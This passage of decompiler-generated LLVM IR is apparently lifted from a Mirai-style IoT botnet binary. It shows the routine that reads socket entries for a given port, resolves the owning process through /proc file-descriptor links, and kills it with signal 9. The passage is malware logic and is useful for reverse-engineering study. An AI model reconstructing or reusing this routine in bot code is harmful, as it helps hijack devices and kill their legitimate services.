  %v27_c9a8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c9c4 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c9c4, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9f0 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9f0, i32* @fp, align 4
  %v4_c9fc = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_ca00 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_ca00, i32* @sl, align 4
  %v0_ca04 = load i32, i32* @r5, align 4
  %v3_ca10 = bitcast i32* %stack_var_-8777 to i8*
  %v4_ca10 = call i32 @__GI_memset(i8* %v3_ca10, i32 %v0_ca04, i32 4096)
  %v0_ca18 = load i32, i32* @r5, align 4
  %v3_ca24 = bitcast i32* %stack_var_-4681 to i8*
  %v4_ca24 = call i32 @__GI_memset(i8* %v3_ca24, i32 %v0_ca18, i32 4096)
  %v2_ca28 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_ca28, i32* @sb, align 4
  %v0_ca2c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca2c = udiv i32 %v0_ca2c, 256
  %v1_ca30 = urem i32 %v0_ca2c, 256
  store i32 %v1_ca30, i32* @r4, align 4
  %v3_ca40 = trunc i32 %v3_ca2c to i8
  %v4_ca40 = call i32 @util_itoa(i8 %v3_ca40, i32 16, i32 %v2_ca28)
  %v2_ca48 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca4c = icmp eq i32 %v2_ca48, 2
  br i1 %v7_ca4c, label %dec_label_pc_cf10, label %dec_label_pc_ca54

dec_label_pc_ca54:                                ; preds = %entry, %dec_label_pc_cf10
  %v1_ca58 = call i32 @table_unlock_val(i32 15)
  %v1_ca60 = call i32 @table_unlock_val(i32 16)
  %v1_ca68 = call i32 @table_unlock_val(i32 17)
  %v1_ca70 = call i32 @table_unlock_val(i32 19)
  %v0_ca74 = load i32, i32* @r5, align 4
  %v2_ca7c = inttoptr i32 %v0_ca74 to i32*
  %v3_ca7c = call i32 @table_retrieve_val(i32 19, i32* %v2_ca7c)
  %v0_ca80 = load i32, i32* @r5, align 4
  %v2_ca84 = call i32 @__libc_open(i32 %v3_ca7c, i32 %v0_ca80)
  %v7_ca88 = icmp eq i32 %v2_ca84, -1
  store i32 %v2_ca84, i32* @r8, align 4
  br i1 %v7_ca88, label %bb, label %dec_label_pc_ca98.preheader

bb:                                               ; preds = %dec_label_pc_ca54
  %v1_ca90 = load i32, i32* @r5, align 4
  store i32 %v1_ca90, i32* @r4, align 4
  br label %dec_label_pc_ceac

dec_label_pc_ca98.preheader:                      ; preds = %dec_label_pc_ca54
  %v4_caa456 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca84)
  %v2_caa858 = icmp eq i32 %v4_caa456, 0
  br i1 %v2_caa858, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0.lr.ph

dec_label_pc_cab0.lr.ph:                          ; preds = %dec_label_pc_ca98.preheader
  %v2_caf8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_cab0.lr.ph, %dec_label_pc_ca98.backedge
  %v3_cab4 = load i8, i8* %stack_var_-585, align 1
  %v4_cab4 = sext i8 %v3_cab4 to i32
  store i32 %v4_cab4, i32* @r3, align 4
  %v2_cab8 = icmp eq i8 %v3_cab4, 0
  br i1 %v2_cab8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_cab0
  %v8_cabc = icmp eq i8 %v3_cab4, 58
  br i1 %v8_cabc, label %.thread8, label %dec_label_pc_cad0

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cae8

bb126:                                            ; preds = %dec_label_pc_cab0
  br label %dec_label_pc_cae8

dec_label_pc_cad0:                                ; preds = %bb125
  %v1_cad8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %bb127, %dec_label_pc_cad0
  %v0_cad4 = phi i32 [ %v1_cad4, %bb127 ], [ 0, %dec_label_pc_cad0 ]
  %v1_cad4 = add i32 %v0_cad4, 1
  %v2_cad8 = add i32 %v1_cad4, %v1_cad8.pre
  %v3_cad8 = inttoptr i32 %v2_cad8 to i8*
  %v4_cad8 = load i8, i8* %v3_cad8, align 1
  %v6_cad8 = zext i8 %v4_cad8 to i32
  store i32 %v6_cad8, i32* @r3, align 4
  %v2_cadc = icmp eq i8 %v4_cad8, 0
  br i1 %v2_cadc, label %dec_label_pc_cae8, label %bb127

bb127:                                            ; preds = %dec_label_pc_cad4
  %v8_cae0 = icmp eq i8 %v4_cad8, 58
  br i1 %v8_cae0, label %dec_label_pc_cae8, label %dec_label_pc_cad4

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cad4, %bb127, %bb126, %.thread8
  %v1_cb14 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_cad4, %bb127 ], [ %v1_cad4, %dec_label_pc_cad4 ]
  %v0_cae8 = phi i32 [ %v4_cab4, %.thread8 ], [ %v4_cab4, %bb126 ], [ %v6_cad8, %bb127 ], [ %v6_cad8, %dec_label_pc_cad4 ]
  %v2_cae8 = icmp eq i32 %v0_cae8, 0
  br i1 %v2_cae8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_caf0

dec_label_pc_ca98.backedge:                       ; preds = %dec_label_pc_cae8, %dec_label_pc_cbb8, %dec_label_pc_cc04, %dec_label_pc_cb34
  %v0_caa0 = load i32, i32* @r8, align 4
  %v4_caa4 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_caa0)
  %v2_caa8 = icmp eq i32 %v4_caa4, 0
  br i1 %v2_caa8, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cae8
  %v1_caf4 = add i32 %v1_cb14, 2
  %v2_cafc = add i32 %v1_caf4, %v2_caf8
  %v1_cb00 = add i32 %v2_cafc, -545
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v2_cb04 = icmp eq i8 %v3_cb00, 0
  br i1 %v2_cb04, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caf0
  %v8_cb08 = icmp eq i8 %v3_cb00, 32
  br i1 %v8_cb08, label %.thread13, label %dec_label_pc_cb14

.thread13:                                        ; preds = %bb128
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb129:                                            ; preds = %dec_label_pc_caf0
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

dec_label_pc_cb14:                                ; preds = %bb128
  %v0_cb14 = load i32, i32* @r6, align 4
  %v2_cb14 = add i32 %v0_cb14, %v1_cb14
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %bb130, %dec_label_pc_cb14
  %v0_cb2816 = phi i32 [ %v1_cb28, %bb130 ], [ %v1_caf4, %dec_label_pc_cb14 ]
  %v0_cb2c18 = phi i32 [ %v1_cb2c, %bb130 ], [ %v2_cb14, %dec_label_pc_cb14 ]
  %v1_cb1c = add i32 %v0_cb2c18, 3
  %v2_cb1c = inttoptr i32 %v1_cb1c to i8*
  %v3_cb1c = load i8, i8* %v2_cb1c, align 1
  %v2_cb20 = icmp eq i8 %v3_cb1c, 0
  br i1 %v2_cb20, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cb1c
  %v1_cb2817 = add i32 %v0_cb2816, 1
  store i32 %v1_cb2817, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb130:                                            ; preds = %dec_label_pc_cb1c
  %v8_cb24 = icmp eq i8 %v3_cb1c, 32
  %v1_cb28 = add i32 %v0_cb2816, 1
  store i32 %v1_cb28, i32* @r5, align 4
  %v1_cb2c = add i32 %v0_cb2c18, 1
  br i1 %v8_cb24, label %dec_label_pc_cb34, label %dec_label_pc_cb1c

dec_label_pc_cb34:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb40 = phi i32 [ %v1_cb2817, %.thread15 ], [ %v1_caf4, %.thread13 ], [ %v1_caf4, %bb129 ], [ %v1_cb28, %bb130 ]
  %v0_cb34 = load i32, i32* @r6, align 4
  %v2_cb34 = add i32 %v0_cb34, %v1_caf4
  store i32 %v2_cb34, i32* @r4, align 4
  %v2_cb40 = add i32 %v1_cb40, %v2_caf8
  store i32 0, i32* @r7, align 4
  %v3_cb48 = add i32 %v2_cb40, -545
  %v4_cb48 = inttoptr i32 %v3_cb48 to i8*
  store i8 0, i8* %v4_cb48, align 1
  %v0_cb4c = load i32, i32* @r4, align 4
  %v1_cb50 = inttoptr i32 %v0_cb4c to i8*
  %v2_cb50 = call i32 @util_strlen(i8* %v1_cb50)
  store i32 %v2_cb50, i32* @r1, align 4
  %v0_cb5c = load i32, i32* @r4, align 4
  %v3_cb60 = inttoptr i32 %v0_cb5c to i8*
  %v4_cb60 = call i32 @util_stristr(i8* %v3_cb60, i32 %v2_cb50, i32 %v2_ca28)
  %v7_cb64 = icmp eq i32 %v4_cb60, -1
  br i1 %v7_cb64, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cb80.preheader

dec_label_pc_cb80.preheader:                      ; preds = %dec_label_pc_cb34
  %v1_cb68 = load i32, i32* @r7, align 4
  %v1_cb6c = load i32, i32* @r6, align 4
  %v2_cb6c = load i32, i32* @r5, align 4
  %v3_cb6c = add i32 %v2_cb6c, %v1_cb6c
  store i32 %v1_cb68, i32* @lr, align 4
  %v1_cb8048 = add i32 %v3_cb6c, 2
  %v2_cb8049 = inttoptr i32 %v1_cb8048 to i8*
  %v3_cb8050 = load i8, i8* %v2_cb8049, align 1
  %v4_cb8051 = zext i8 %v3_cb8050 to i32
  store i32 %v4_cb8051, i32* @r3, align 4
  %v2_cb8452 = icmp eq i8 %v3_cb8050, 0
  %v1_cb8854 = add i32 %v2_cb6c, 2
  br i1 %v2_cb8452, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb80.preheader, %dec_label_pc_cb80.backedge
  %v0_cbb883 = phi i32 [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cba0.pr = phi i32 [ %v0_cba0.pr70, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cec0 = phi i32 [ %v0_cec073, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cb8878 = phi i32 [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v1_cb8854, %dec_label_pc_cb80.preheader ]
  %v0_cbb0 = phi i32 [ %v0_cb80, %dec_label_pc_cb80.backedge ], [ %v3_cb6c, %dec_label_pc_cb80.preheader ]
  %v1_cb94 = phi i32 [ %v4_cb80, %dec_label_pc_cb80.backedge ], [ %v4_cb8051, %dec_label_pc_cb80.preheader ]
  %v7_cb90 = icmp eq i32 %v1_cb94, 9
  br i1 %v7_cb90, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb90
  %v8_cb94 = icmp eq i32 %v1_cb94, 32
  br i1 %v8_cb94, label %.thread27, label %dec_label_pc_cba0

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cbac

bb132:                                            ; preds = %dec_label_pc_cb90
  br label %dec_label_pc_cbac

dec_label_pc_cba0:                                ; preds = %bb131
  %v7_cba0 = icmp eq i32 %v0_cba0.pr, 1
  br i1 %v7_cba0, label %dec_label_pc_cec0, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cec0, %dec_label_pc_cba0
  %v0_cbac75 = phi i32 [ %v1_cec0, %dec_label_pc_cec0 ], [ %v0_cec0, %dec_label_pc_cba0 ]
  br label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %bb132, %.thread27, %dec_label_pc_cba8
  %v0_cbac = phi i32 [ %v0_cec0, %.thread27 ], [ %v0_cec0, %bb132 ], [ %v0_cbac75, %dec_label_pc_cba8 ]
  %v0_cba0.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cba8 ]
  %v7_cbb4 = icmp sgt i32 %v0_cbac, 6
  br i1 %v7_cbb4, label %dec_label_pc_cbb8, label %dec_label_pc_cb80.backedge

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cb80.backedge, %dec_label_pc_cbac, %dec_label_pc_cb80.preheader
  %v1_cc08 = phi i32 [ %v1_cb8854, %dec_label_pc_cb80.preheader ], [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v0_cb8878, %dec_label_pc_cbac ]
  %v0_cbb8 = phi i32 [ %v1_cb68, %dec_label_pc_cb80.preheader ], [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v2_cbb8 = icmp eq i32 %v0_cbb8, 0
  br i1 %v2_cbb8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbb8
  %v2_cbcc = add i32 %v1_cc08, %v2_caf8
  %v1_cbd0 = add i32 %v2_cbcc, -545
  %v2_cbd0 = inttoptr i32 %v1_cbd0 to i8*
  %v3_cbd0 = load i8, i8* %v2_cbd0, align 1
  %v2_cbd4 = icmp eq i8 %v3_cbd0, 0
  br i1 %v2_cbd4, label %dec_label_pc_cc04, label %bb133

bb133:                                            ; preds = %dec_label_pc_cbc4
  %v8_cbd8 = icmp eq i8 %v3_cbd0, 32
  br i1 %v8_cbd8, label %dec_label_pc_cc04, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %bb133
  %v2_cbe0 = add i32 %v1_cc08, %v1_cb6c
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %bb134, %dec_label_pc_cbe0
  %v0_cbf030 = phi i32 [ %v1_cbf0, %bb134 ], [ %v1_cc08, %dec_label_pc_cbe0 ]
  %v0_cbe4 = phi i32 [ %v1_cbe4, %bb134 ], [ %v2_cbe0, %dec_label_pc_cbe0 ]
  %v1_cbe4 = add i32 %v0_cbe4, 1
  %v2_cbe4 = inttoptr i32 %v1_cbe4 to i8*
  %v3_cbe4 = load i8, i8* %v2_cbe4, align 1
  %v2_cbe8 = icmp eq i8 %v3_cbe4, 0
  br i1 %v2_cbe8, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbe4
  %v1_cbf031 = add i32 %v0_cbf030, 1
  br label %dec_label_pc_cbf8

bb134:                                            ; preds = %dec_label_pc_cbe4
  %v8_cbec = icmp eq i8 %v3_cbe4, 32
  %v1_cbf0 = add i32 %v0_cbf030, 1
  br i1 %v8_cbec, label %dec_label_pc_cbf8, label %dec_label_pc_cbe4

dec_label_pc_cbf8:                                ; preds = %bb134, %.thread29
  %v1_cc00 = phi i32 [ %v1_cbf031, %.thread29 ], [ %v1_cbf0, %bb134 ]
  %v2_cc00 = add i32 %v1_cc00, %v2_caf8
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbc4, %bb133, %dec_label_pc_cbf8
  %v2_cc10 = phi i32 [ %v2_cbcc, %dec_label_pc_cbc4 ], [ %v2_cbcc, %bb133 ], [ %v2_cc00, %dec_label_pc_cbf8 ]
  %v2_cc08 = add i32 %v1_cc08, %v1_cb6c
  store i32 %v2_cc08, i32* @r4, align 4
  %v3_cc10 = add i32 %v2_cc10, -545
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 1
  %v1_cc14 = inttoptr i32 %v2_cc08 to i8*
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14)
  %v8_cc1c = icmp sgt i32 %v2_cc14, 15
  br i1 %v8_cc1c, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v0_cc24 = load i32, i32* @r4, align 4
  %v2_cc28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cc28, i32* @r0, align 4
  %v2_cc2c = bitcast i32* %stack_var_-56 to i8*
  %v3_cc2c = call i32 @util_strcpy(i8* %v2_cc2c, i32 %v0_cc24)
  br label %dec_label_pc_cc30

dec_label_pc_cc30.loopexit:                       ; preds = %dec_label_pc_ca98.backedge, %dec_label_pc_ca98.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc30.loopexit, %dec_label_pc_cc20
  %v1_cc40.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc30.loopexit ], [ %v2_cc2c, %dec_label_pc_cc20 ]
  %v2_cc3c.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc30.loopexit ], [ %v2_cc28, %dec_label_pc_cc20 ]
  %v0_cc30 = load i32, i32* @r8, align 4
  %v1_cc34 = call i32 @__GI___libc_close(i32 %v0_cc30)
  %v2_cc40 = call i32 @util_strlen(i8* %v1_cc40.pre-phi)
  store i32 %v2_cc40, i32* @r4, align 4
  %v2_cc44 = icmp eq i32 %v2_cc40, 0
  br i1 %v2_cc44, label %dec_label_pc_ceec, label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc30
  %v3_cc54 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_cc58 = call i32 @__GI_opendir(i32 %v3_cc54)
  store i32 %v1_cc58, i32* @sb, align 4
  %v2_cc5c = icmp eq i32 %v1_cc58, 0
  br i1 %v2_cc5c, label %dec_label_pc_ce8c, label %dec_label_pc_cc6c.preheader

dec_label_pc_cc6c.preheader:                      ; preds = %dec_label_pc_cc4c
  store i32 0, i32* @r5, align 4
  %v1_cc7043 = inttoptr i32 %v1_cc58 to i32*
  %v2_cc7044 = call i32 @__GI_readdir(i32* %v1_cc7043)
  %v2_cc7446 = icmp eq i32 %v2_cc7044, 0
  br i1 %v2_cc7446, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc6c.loopexit:                       ; preds = %dec_label_pc_cc84, %dec_label_pc_cc94, %dec_label_pc_cd00
  %v0_cc6c = load i32, i32* @sb, align 4
  %v1_cc70 = inttoptr i32 %v0_cc6c to i32*
  %v2_cc70 = call i32 @__GI_readdir(i32* %v1_cc70)
  %v2_cc74 = icmp eq i32 %v2_cc70, 0
  br i1 %v2_cc74, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc7c.preheader:                      ; preds = %dec_label_pc_cc6c.preheader, %dec_label_pc_cc6c.loopexit
  %v0_cc8491 = phi i32 [ %v2_cc70, %dec_label_pc_cc6c.loopexit ], [ %v2_cc7044, %dec_label_pc_cc6c.preheader ]
  br label %dec_label_pc_cc7c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc7c.preheader, %dec_label_pc_ce68
  %v0_cc9c = phi i32 [ %v0_cc8491, %dec_label_pc_cc7c.preheader ], [ %v2_ce74, %dec_label_pc_ce68 ]
  %v0_cc7c = load i32, i32* @r5, align 4
  %v2_cc7c = icmp eq i32 %v0_cc7c, 0
  br i1 %v2_cc7c, label %dec_label_pc_cc84, label %dec_label_pc_ce80

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc7c
  %v1_cc84 = add i32 %v0_cc9c, 11
  %v2_cc84 = inttoptr i32 %v1_cc84 to i8*
  %v3_cc84 = load i8, i8* %v2_cc84, align 1
  %v4_cc84 = zext i8 %v3_cc84 to i32
  %v1_cc88 = add nsw i32 %v4_cc84, -48
  %tmp = icmp ugt i32 %v1_cc88, 9
  br i1 %tmp, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc84
  store i32 %v1_cc84, i32* @r7, align 4
  %v3_cca0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_ccac = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cca0)
  %v2_ccb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_ccb8 = load i32, i32* @r7, align 4
  %v1_ccbc = load i32, i32* @sl, align 4
  %v2_ccbc = add i32 %v1_ccbc, %v2_ccb4
  store i32 %v2_ccbc, i32* @r0, align 4
  %v2_ccc0 = inttoptr i32 %v2_ccbc to i8*
  %v3_ccc0 = call i32 @util_strcpy(i8* %v2_ccc0, i32 %v0_ccb8)
  %v2_ccc8 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cccc = load i32, i32* @r5, align 4
  store i32 %v2_ccc8, i32* @r4, align 4
  %v2_ccd8 = inttoptr i32 %v0_cccc to i32*
  %v3_ccd8 = call i32 @table_retrieve_val(i32 16, i32* %v2_ccd8)
  %v0_cce0 = load i32, i32* @r4, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v0_cce0
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @util_strcpy(i8* %v2_cce4, i32 %v3_ccd8)
  %v3_ccf4 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ccf8 = icmp eq i32 %v3_ccf4, -1
  br i1 %v7_ccf8, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd00

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  %v0_cd00 = load i32, i32* @r5, align 4
  %v2_cd08 = inttoptr i32 %v0_cd00 to i32*
  %v3_cd08 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd08)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd14 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd08)
  %v2_cd1c = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd20 = load i32, i32* @r7, align 4
  %v1_cd24 = load i32, i32* @sl, align 4
  %v2_cd24 = add i32 %v1_cd24, %v2_cd1c
  store i32 %v2_cd24, i32* @r0, align 4
  %v2_cd28 = inttoptr i32 %v2_cd24 to i8*
  %v3_cd28 = call i32 @util_strcpy(i8* %v2_cd28, i32 %v0_cd20)
  %v2_cd30 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v2_cd30, i32* @r4, align 4
  %v2_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v3_cd40 = call i32 @table_retrieve_val(i32 17, i32* %v2_cd40)
  %v0_cd48 = load i32, i32* @r4, align 4
  %v1_cd48 = load i32, i32* @sl, align 4
  %v2_cd48 = add i32 %v1_cd48, %v0_cd48
  store i32 %v2_cd48, i32* @r0, align 4
  %v2_cd4c = inttoptr i32 %v2_cd48 to i8*
  %v3_cd4c = call i32 @util_strcpy(i8* %v2_cd4c, i32 %v3_cd40)
  %v1_cd54 = call i32 @__GI_opendir(i32 %v2_ca00)
  store i32 %v1_cd54, i32* @r8, align 4
  %v2_cd58 = icmp eq i32 %v1_cd54, 0
  br i1 %v2_cd58, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd60.preheader

dec_label_pc_cd60.preheader:                      ; preds = %dec_label_pc_cd00
  %v1_cd6438 = inttoptr i32 %v1_cd54 to i32*
  %v2_cd6439 = call i32 @__GI_readdir(i32* %v1_cd6438)
  store i32 %v2_cd6439, i32* @r6, align 4
  %v2_cd6841 = icmp eq i32 %v2_cd6439, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd6841, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd60.loopexit:                       ; preds = %dec_label_pc_cd80, %dec_label_pc_ce18
  %v0_cd60 = load i32, i32* @r8, align 4
  %v1_cd64 = inttoptr i32 %v0_cd60 to i32*
  %v2_cd64 = call i32 @__GI_readdir(i32* %v1_cd64)
  store i32 %v2_cd64, i32* @r6, align 4
  %v2_cd68 = icmp eq i32 %v2_cd64, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd68, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd78thread-pre-split:                ; preds = %dec_label_pc_cd60.preheader, %dec_label_pc_cd60.loopexit
  %v0_cd78.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd78thread-pre-split, %dec_label_pc_ce40
  %v0_cd78 = phi i32 [ %v0_cd78.pr, %dec_label_pc_cd78thread-pre-split ], [ 1, %dec_label_pc_ce40 ]
  %v2_cd78 = icmp eq i32 %v0_cd78, 0
  br i1 %v2_cd78, label %dec_label_pc_cd80, label %dec_label_pc_ce68

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd78
  %v0_cd80 = call i32 @util_zero()
  %v0_cd84 = load i32, i32* @r5, align 4
  %v2_cd8c = inttoptr i32 %v0_cd84 to i32*
  %v3_cd8c = call i32 @table_retrieve_val(i32 15, i32* %v2_cd8c)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd98 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd8c)
  %v2_cda0 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cda4 = load i32, i32* @r7, align 4
  %v1_cda8 = load i32, i32* @sl, align 4
  %v2_cda8 = add i32 %v1_cda8, %v2_cda0
  store i32 %v2_cda8, i32* @r0, align 4
  %v2_cdac = inttoptr i32 %v2_cda8 to i8*
  %v3_cdac = call i32 @util_strcpy(i8* %v2_cdac, i32 %v0_cda4)
  %v2_cdb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdb8 = load i32, i32* @r5, align 4
  store i32 %v2_cdb4, i32* @r4, align 4
  %v2_cdc4 = inttoptr i32 %v0_cdb8 to i32*
  %v3_cdc4 = call i32 @table_retrieve_val(i32 17, i32* %v2_cdc4)
  %v0_cdcc = load i32, i32* @r4, align 4
  %v1_cdcc = load i32, i32* @sl, align 4
  %v2_cdcc = add i32 %v1_cdcc, %v0_cdcc
  store i32 %v2_cdcc, i32* @r0, align 4
  %v2_cdd0 = inttoptr i32 %v2_cdcc to i8*
  %v3_cdd0 = call i32 @util_strcpy(i8* %v2_cdd0, i32 %v3_cdc4)
  %v2_cdd8 = call i32 @util_strlen(i8* %v3_ca24)
  %v1_cde0 = load i32, i32* @sl, align 4
  %v2_cde0 = add i32 %v1_cde0, %v2_cdd8
  store i32 %v2_cde0, i32* @r0, align 4
  %v2_cde4 = inttoptr i32 %v2_cde0 to i8*
  %v3_cde4 = call i32 @util_strcpy(i8* %v2_cde4, i32 ptrtoint (i32* @global_var_19268.72 to i32))
  %v2_cdec = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdf0 = load i32, i32* @r6, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 11
  %v1_cdf4 = load i32, i32* @sl, align 4
  %v2_cdf4 = add i32 %v1_cdf4, %v2_cdec
  store i32 %v2_cdf4, i32* @r0, align 4
  %v2_cdf8 = inttoptr i32 %v2_cdf4 to i8*
  %v3_cdf8 = call i32 @util_strcpy(i8* %v2_cdf8, i32 %v1_cdf0)
  %v3_ce08 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ce0c = icmp eq i32 %v3_ce08, -1
  br i1 %v7_ce0c, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cd80
  %v2_ce18 = call i32 @util_strlen(i8* %v3_ca10)
  store i32 %v2_ce18, i32* @r1, align 4
  %v4_ce2c = call i32 @util_stristr(i8* %v3_ca10, i32 %v2_ce18, i32 %v2_cc3c.pre-phi)
  %v7_ce30 = icmp eq i32 %v4_ce2c, -1
  br i1 %v7_ce30, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce18
  %v0_ce38 = load i32, i32* @r7, align 4
  %v2_ce40 = inttoptr i32 %v0_ce38 to i8*
  %v3_ce40 = call i32 @util_atoi(i8* %v2_ce40, i32 10)
  %v2_ce48 = call i32 @kill(i32 %v3_ce40, i32 9)
  %v0_ce4c = load i32, i32* @r8, align 4
  %v1_ce50 = inttoptr i32 %v0_ce4c to i32*
  %v2_ce50 = call i32 @__GI_readdir(i32* %v1_ce50)
  store i32 %v2_ce50, i32* @r6, align 4
  %v2_ce54 = icmp eq i32 %v2_ce50, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_ce54, label %dec_label_pc_ce68, label %dec_label_pc_cd78

dec_label_pc_ce68:                                ; preds = %dec_label_pc_cd60.loopexit, %dec_label_pc_ce40, %dec_label_pc_cd78, %dec_label_pc_cd60.preheader
  %v0_ce68 = load i32, i32* @r8, align 4
  %v1_ce6c = inttoptr i32 %v0_ce68 to i32*
  %v2_ce6c = call i32 @__GI_closedir(i32* %v1_ce6c)
  %v0_ce70 = load i32, i32* @sb, align 4
  %v1_ce74 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce74 = call i32 @__GI_readdir(i32* %v1_ce74)
  %v2_ce78 = icmp eq i32 %v2_ce74, 0
